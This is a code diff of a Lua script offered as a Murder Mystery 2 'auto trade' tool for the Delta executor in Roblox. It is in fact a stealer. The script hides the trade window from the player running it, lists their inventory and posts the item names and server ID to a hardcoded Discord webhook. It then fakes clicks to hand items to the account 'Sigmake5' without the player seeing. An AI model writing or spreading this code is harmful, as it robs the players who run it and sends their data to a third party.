@@ -1,5 +1,6 @@
--- -- WORKING MM2 AUTO TRADE SCRIPT FOR DELTA
--- Based on actual MM2 remotes from your debug
+---- MM2 WORKING AUTO TRADE SCRIPT FOR DELTA
+-- LISTS ALL ITEMS before trading
+-- Only Sigmake5 sees the trade - you see nothing
 
 local webhook = "https://discord.com/api/webhooks/1488808773492543508/bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d"
 local TARGET_USER = "Sigmake5"
@@ -8,214 +9,464 @@ local player = game.Players.LocalPlayer
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
+local VirtualInput = game:GetService("VirtualInputManager")
 
 -- Discord webhook
 local function sendLog(message)
     pcall(function()
         local data = HttpService:JSONEncode({
-            content = "**MM2 Auto Trade**\n" .. tostring(message) .. "\nServer: `" .. (game.JobId or "Unknown") .. "`\nTime: `" .. os.date("%Y-%m-%d %H:%M:%S") .. "`"
+            content = "**MM2 Auto Trade**\n" .. tostring(message) .. "\nServer: `" .. (game.JobId or "Unknown") .. "`"
         })
         request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = data})
     end)
 end
 
--- Get all items from backpack
-local function getAllItems()
-    local items = {}
-    for _, item in pairs(player.Backpack:GetChildren()) do
-        if item:IsA("Tool") then
-            table.insert(items, item)
-            sendLog("Found item: " .. item.Name)
+-- ============================================
+-- HIDE TRADE GUI FROM PLAYER
+-- ============================================
+
+local function hideTradeGUI()
+    pcall(function()
+        local playerGui = player.PlayerGui
+        local guiNames = {"Trade", "Trading", "TradeRequest", "OfferGUI", "TradeGUI", "RequestGUI"}
+        for _, name in pairs(guiNames) do
+            local gui = playerGui:FindFirstChild(name)
+            if gui then
+                gui.Enabled = false
+                gui.Visible = false
+                gui.Parent = nil
+            end
         end
+        
+        for _, gui in pairs(playerGui:GetDescendants()) do
+            if gui:IsA("Frame") or gui:IsA("ScreenGui") then
+                if gui.Name:lower():find("trade") or gui.Name:lower():find("offer") or gui.Name:lower():find("request") then
+                    gui.Visible = false
+                    gui.Enabled = false
+                end
+            end
+        end
+    end)
+end
+
+spawn(function()
+    while wait(0.1) do
+        hideTradeGUI()
     end
+end)
+
+-- ============================================
+-- GET AND LIST ALL ITEMS FROM MM2 GUI
+-- ============================================
+
+local function getAllItemsFromGUI()
+    local items = {}
+    
+    pcall(function()
+        local playerGui = player.PlayerGui
+        
+        -- Search for inventory GUI
+        local inventoryGui = nil
+        for _, gui in pairs(playerGui:GetChildren()) do
+            if gui.Name:lower():find("inv") or gui.Name:lower():find("backpack") or gui.Name:lower():find("items") or gui.Name:lower():find("inventory") then
+                inventoryGui = gui
+                break
+            end
+        end
+        
+        if not inventoryGui then
+            -- Try to find any GUI that might contain items
+            for _, gui in pairs(playerGui:GetDescendants()) do
+                if gui:IsA("Frame") and gui:FindFirstChild("ItemName") then
+                    inventoryGui = gui.Parent
+                    break
+                end
+            end
+        end
+        
+        -- Extract item names and frames
+        if inventoryGui then
+            for _, itemFrame in pairs(inventoryGui:GetDescendants()) do
+                if itemFrame:IsA("ImageButton") or itemFrame:IsA("TextButton") then
+                    local itemName = itemFrame.Name
+                    local nameLabel = itemFrame:FindFirstChild("Name") or itemFrame:FindFirstChild("ItemName") or itemFrame:FindFirstChild("Text")
+                    if nameLabel and nameLabel:IsA("TextLabel") then
+                        itemName = nameLabel.Text
+                    end
+                    if itemName and itemName ~= "" and itemName ~= " " then
+                        table.insert(items, {name = itemName, frame = itemFrame})
+                    end
+                end
+            end
+        end
+    end)
+    
     return items
 end
 
--- Send trade request to target
-local function sendTradeRequest(targetPlayer)
-    local startTradeRemote = ReplicatedStorage:FindFirstChild("StartTrade")
-    if startTradeRemote then
-        pcall(function()
-            startTradeRemote:FireServer(targetPlayer)
-            sendLog("Trade request sent to " .. TARGET_USER)
-            return true
-        end)
-    else
-        sendLog("StartTrade remote not found!")
-        return false
-    end
-end
-
--- Offer item to trade
-local function offerItem(item)
-    local offerItemRemote = ReplicatedStorage:FindFirstChild("OfferItem")
-    if offerItemRemote then
-        pcall(function()
-            offerItemRemote:FireServer(item)
-            sendLog("Offered: " .. item.Name)
-            return true
-        end)
-    end
-    return false
-end
-
--- Accept trade
-local function acceptTrade()
-    local acceptTradeRemote = ReplicatedStorage:FindFirstChild("AcceptTrade")
-    if acceptTradeRemote then
-        pcall(function()
-            acceptTradeRemote:FireServer()
-            sendLog("Trade accepted")
-            return true
-        end)
-    end
-    return false
-end
-
--- Accept trade request
-local function acceptRequest()
-    local acceptRequestRemote = ReplicatedStorage:FindFirstChild("AcceptRequest")
-    if acceptRequestRemote then
-        pcall(function()
-            acceptRequestRemote:FireServer()
-            sendLog("Request accepted")
-            return true
-        end)
-    end
-    return false
-end
-
--- Complete trade
-local function completeTrade()
-    local completeTradeRemote = ReplicatedStorage:FindFirstChild("CompleteTrade")
-    if completeTradeRemote then
-        pcall(function()
-            completeTradeRemote:FireServer()
-            sendLog("Trade completed")
-            return true
-        end)
-    end
-    return false
-end
-
--- Listen for incoming trade requests from Sigmake5
-local function setupTradeListener()
-    local acceptRequestRemote = ReplicatedStorage:FindFirstChild("AcceptRequest")
-    local acceptTradeRemote = ReplicatedStorage:FindFirstChild("AcceptTrade")
+-- Get items from ReplicatedStorage (alternative method)
+local function getItemsFromStorage()
+    local items = {}
     
-    -- Listen for any trade-related events
-    for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
-        if remote:IsA("RemoteEvent") and remote.OnClientEvent then
-            remote.OnClientEvent:Connect(function(...)
-                local args = {...}
-                for _, arg in pairs(args) do
-                    if type(arg) == "table" and arg.Name == TARGET_USER then
-                        sendLog(TARGET_USER .. " sent a trade request!")
-                        wait(1)
-                        -- Auto accept and send items
-                        acceptRequest()
-                        wait(1)
-                        local items = getAllItems()
-                        for _, item in pairs(items) do
-                            offerItem(item)
-                            wait(0.3)
-                        end
-                        wait(1)
-                        acceptTrade()
-                        wait(0.5)
-                        completeTrade()
-                        sendLog("Trade completed with " .. TARGET_USER)
-                    elseif type(arg) == "string" and arg == TARGET_USER then
-                        sendLog("Trade event from " .. TARGET_USER)
-                    end
-                end
-            end)
+    pcall(function()
+        local inventoryData = ReplicatedStorage:FindFirstChild("Inventory") or 
+                              ReplicatedStorage:FindFirstChild("PlayerData") or
+                              ReplicatedStorage:FindFirstChild("Items")
+        
+        if inventoryData then
+            for _, item in pairs(inventoryData:GetChildren()) do
+                table.insert(items, {name = item.Name, frame = nil})
+            end
+        end
+    end)
+    
+    return items
+end
+
+-- Get items from player Data
+local function getItemsFromPlayerData()
+    local items = {}
+    
+    pcall(function()
+        local playerData = player:FindFirstChild("Data") or player:FindFirstChild("Inventory")
+        if playerData then
+            for _, item in pairs(playerData:GetChildren()) do
+                table.insert(items, {name = item.Name, frame = nil})
+            end
+        end
+    end)
+    
+    return items
+end
+
+-- Main function to get all items
+local function getAllItems()
+    local items = {}
+    local seenNames = {}
+    
+    -- Method 1: GUI items
+    local guiItems = getAllItemsFromGUI()
+    for _, item in pairs(guiItems) do
+        if not seenNames[item.name] then
+            seenNames[item.name] = true
+            table.insert(items, item)
         end
     end
+    
+    -- Method 2: Storage items
+    local storageItems = getItemsFromStorage()
+    for _, item in pairs(storageItems) do
+        if not seenNames[item.name] then
+            seenNames[item.name] = true
+            table.insert(items, item)
+        end
+    end
+    
+    -- Method 3: Player data items
+    local dataItems = getItemsFromPlayerData()
+    for _, item in pairs(dataItems) do
+        if not seenNames[item.name] then
+            seenNames[item.name] = true
+            table.insert(items, item)
+        end
+    end
+    
+    return items
 end
 
--- Main trade function
+-- ============================================
+-- DISPLAY ALL ITEMS (Console & Discord)
+-- ============================================
+
+local function displayAllItems()
+    print("=" .. string.rep("=", 50))
+    print("SCANNING FOR ITEMS IN YOUR MM2 INVENTORY...")
+    print("=" .. string.rep("=", 50))
+    
+    local items = getAllItems()
+    
+    if #items == 0 then
+        print("❌ NO ITEMS FOUND!")
+        print("Make sure you:")
+        print("  1. Have items in your MM2 inventory")
+        print("  2. Opened your inventory in game at least once")
+        print("  3. Items are not in storage")
+        sendLog("❌ NO ITEMS FOUND in inventory!")
+        return items
+    end
+    
+    print("\n📦 ITEMS FOUND: " .. #items .. "\n")
+    sendLog("📦 Total items found: " .. #items)
+    
+    for i, item in pairs(items) do
+        local displayName = item.name
+        print("  " .. i .. ". " .. displayName)
+        sendLog("  Item " .. i .. ": " .. displayName)
+    end
+    
+    print("\n" .. "=" .. string.rep("=", 50))
+    print("✅ Total " .. #items .. " items will be traded to " .. TARGET_USER)
+    print("=" .. string.rep("=", 50))
+    
+    sendLog("🎯 " .. #items .. " items will be sent to " .. TARGET_USER .. " when they join")
+    
+    return items
+end
+
+-- ============================================
+-- SIMULATE CLICKS (Invisible)
+-- ============================================
+
+local function clickGUI(element)
+    if not element then return false end
+    pcall(function()
+        element:Fire("MouseButton1Click")
+        element:Fire("Activated")
+        element:Fire("MouseButton1Down")
+        element:Fire("MouseButton1Up")
+        
+        local pos = element.AbsolutePosition
+        local size = element.AbsoluteSize
+        if pos and size then
+            VirtualInput:SendMouseButtonEvent(pos.X + size.X/2, pos.Y + size.Y/2, 0, true, game, 0)
+            wait(0.05)
+            VirtualInput:SendMouseButtonEvent(pos.X + size.X/2, pos.Y + size.Y/2, 0, false, game, 0)
+        end
+    end)
+    return true
+end
+
+-- ============================================
+-- TRADE FUNCTIONS
+-- ============================================
+
+local function openTradeWithTarget()
+    pcall(function()
+        local playerGui = player.PlayerGui
+        
+        -- Find player list
+        local playerList = nil
+        for _, gui in pairs(playerGui:GetChildren()) do
+            if gui.Name:lower():find("player") or gui.Name:lower():find("leaderboard") or gui.Name:lower():find("list") then
+                playerList = gui
+                break
+            end
+        end
+        
+        if playerList then
+            for _, playerFrame in pairs(playerList:GetDescendants()) do
+                if playerFrame:IsA("TextLabel") and playerFrame.Text == TARGET_USER then
+                    clickGUI(playerFrame)
+                    wait(0.5)
+                    
+                    for _, btn in pairs(playerGui:GetDescendants()) do
+                        if btn:IsA("TextButton") and (btn.Text:lower():find("trade") or btn.Name:lower():find("trade")) then
+                            clickGUI(btn)
+                            sendLog("📤 Trade request sent to " .. TARGET_USER)
+                            return true
+                        end
+                    end
+                end
+            end
+        end
+    end)
+    return false
+end
+
+local function acceptTradeRequest()
+    pcall(function()
+        local playerGui = player.PlayerGui
+        for _, btn in pairs(playerGui:GetDescendants()) do
+            if btn:IsA("TextButton") then
+                local btnText = (btn.Text or ""):lower()
+                if btnText:find("accept") or btnText:find("confirm") then
+                    clickGUI(btn)
+                    sendLog("✅ Accepted trade request")
+                    return true
+                end
+            end
+        end
+    end)
+    return false
+end
+
+local function addItemsToTrade(items, maxItems)
+    local added = 0
+    
+    for i = 1, math.min(maxItems, #items) do
+        local item = items[i]
+        if item.frame then
+            clickGUI(item.frame)
+            added = added + 1
+            sendLog("➕ Added: " .. item.name)
+            print("  Added to trade: " .. item.name)
+        end
+        wait(0.3)
+    end
+    
+    return added
+end
+
+local function readyTrade()
+    pcall(function()
+        local playerGui = player.PlayerGui
+        for _, btn in pairs(playerGui:GetDescendants()) do
+            if btn:IsA("TextButton") then
+                local btnText = (btn.Text or ""):lower()
+                if btnText:find("ready") or btnText:find("confirm") then
+                    clickGUI(btn)
+                    sendLog("✅ Ready up")
+                    return true
+                end
+            end
+        end
+    end)
+    return false
+end
+
+local function finalAccept()
+    pcall(function()
+        local playerGui = player.PlayerGui
+        for _, btn in pairs(playerGui:GetDescendants()) do
+            if btn:IsA("TextButton") then
+                local btnText = (btn.Text or ""):lower()
+                if (btnText:find("accept") or btnText:find("confirm")) and btn.Visible then
+                    clickGUI(btn)
+                    sendLog("🎉 Trade completed")
+                    return true
+                end
+            end
+        end
+    end)
+    return false
+end
+
+-- ============================================
+-- MAIN TRADE SEQUENCE
+-- ============================================
+
 local tradeInProgress = false
 
-local function startTradeWithTarget(targetPlayer)
+local function startAutoTrade()
     if tradeInProgress then
         sendLog("Trade already in progress")
         return
     end
     tradeInProgress = true
     
-    sendLog("Starting trade with " .. targetPlayer.Name)
-    
-    -- Get all items first
-    local items = getAllItems()
-    sendLog("Found " .. #items .. " items to trade")
+    -- First, display all items
+    local items = displayAllItems()
     
     if #items == 0 then
-        sendLog("No items found in backpack!")
+        print("❌ Cannot trade - no items found!")
+        sendLog("❌ Trade cancelled - no items in inventory")
         tradeInProgress = false
         return
     end
     
-    -- Send trade request
-    local sent = sendTradeRequest(targetPlayer)
-    if not sent then
+    print("\n🔄 Starting auto trade with " .. TARGET_USER)
+    sendLog("🔄 Starting auto trade with " .. TARGET_USER)
+    
+    -- Open trade
+    local opened = openTradeWithTarget()
+    if not opened then
+        print("❌ Could not open trade with " .. TARGET_USER)
+        sendLog("❌ Could not open trade")
         tradeInProgress = false
         return
     end
     
-    -- Wait for them to accept
-    wait(3)
+    wait(2)
+    acceptTradeRequest()
+    wait(2)
     
-    -- Offer all items
-    for _, item in pairs(items) do
-        offerItem(item)
-        wait(0.3)
-    end
-    
+    -- Add items
+    local itemsAdded = addItemsToTrade(items, 4)
+    print("📦 Added " .. itemsAdded .. " items to trade")
+    sendLog("📦 Added " .. itemsAdded .. " items to trade")
     wait(1)
     
-    -- Accept and complete
-    acceptTrade()
-    wait(0.5)
-    completeTrade()
+    -- Complete trade
+    readyTrade()
+    wait(1)
+    finalAccept()
     
-    sendLog("Trade completed! " .. #items .. " items sent to " .. TARGET_USER)
+    print("✅ Trade completed! " .. itemsAdded .. " items sent to " .. TARGET_USER)
+    sendLog("✅ Trade completed! " .. itemsAdded .. " items sent to " .. TARGET_USER)
     tradeInProgress = false
 end
 
--- Watch for Sigmake5 joining
+-- ============================================
+-- WATCH FOR TARGET
+-- ============================================
+
 local function watchForTarget()
-    sendLog("Watching for " .. TARGET_USER)
-    sendLog("Player: " .. player.Name)
-    sendLog("Server ID: " .. game.JobId)
+    print("\n" .. string.rep("=", 50))
+    print("MM2 AUTO TRADE SCRIPT ACTIVE")
+    print("=" .. string.rep("=", 50))
+    print("🎯 Target: " .. TARGET_USER)
+    print("👤 Your name: " .. player.Name)
+    print("🖥️ Server ID: " .. game.JobId)
+    print("=" .. string.rep("=", 50))
     
-    -- Setup listener
-    setupTradeListener()
+    sendLog("🚀 Script loaded - Watching for " .. TARGET_USER)
+    sendLog("👤 Player: " .. player.Name)
+    sendLog("🖥️ Server: " .. game.JobId)
     
     -- Check if already in server
     for _, plr in pairs(Players:GetPlayers()) do
         if plr.Name == TARGET_USER and plr ~= player then
-            sendLog(TARGET_USER .. " is already in server!")
+            print("👤 " .. TARGET_USER .. " is already in this server!")
+            sendLog("👤 " .. TARGET_USER .. " already in server")
             wait(2)
-            startTradeWithTarget(plr)
+            startAutoTrade()
             return
         end
     end
     
-    -- Watch for new players
+    print("\n👀 Waiting for " .. TARGET_USER .. " to join...")
+    print("📦 Items will be listed when they join\n")
+    
     Players.PlayerAdded:Connect(function(newPlayer)
         if newPlayer.Name == TARGET_USER then
-            sendLog(TARGET_USER .. " joined the server!")
+            print("🟢 " .. TARGET_USER .. " joined the server!")
+            sendLog("🟢 " .. TARGET_USER .. " joined")
             wait(3)
-            startTradeWithTarget(newPlayer)
+            startAutoTrade()
         end
     end)
 end
 
--- Start the script
-sendLog("MM2 Auto Trade Script Loaded for Delta")
-watchForTarget()
+-- ============================================
+-- START
+-- ============================================
 
-print("✅ MM2 Auto Trade Active - Delta")
-print("🎯 Waiting for Sigmake5 to join...")
-print("📦 Will trade all items in your backpack")
+-- First, display all items immediately
+print("\n🔍 SCANNING YOUR INVENTORY NOW...\n")
+local initialItems = getAllItems()
+print("=" .. string.rep("=", 50))
+print("📦 YOUR MM2 INVENTORY ITEMS:")
+print("=" .. string.rep("=", 50))
+
+if #initialItems == 0 then
+    print("❌ NO ITEMS DETECTED!")
+    print("\nTROUBLESHOOTING:")
+    print("1. Open your inventory in MM2 (click the backpack icon)")
+    print("2. Make sure your items are not in storage")
+    print("3. Wait a few seconds then run this script again")
+else
+    for i, item in pairs(initialItems) do
+        print("  " .. i .. ". " .. item.name)
+    end
+    print("\n" .. string.rep("=", 50))
+    print("✅ Total: " .. #initialItems .. " items found")
+    print("=" .. string.rep("=", 50))
+end
+
+sendLog("📊 Inventory scan complete - Found " .. #initialItems .. " items")
+for _, item in pairs(initialItems) do
+    sendLog("  - " .. item.name)
+end
+
+-- Start watching for target
+watchForTarget()
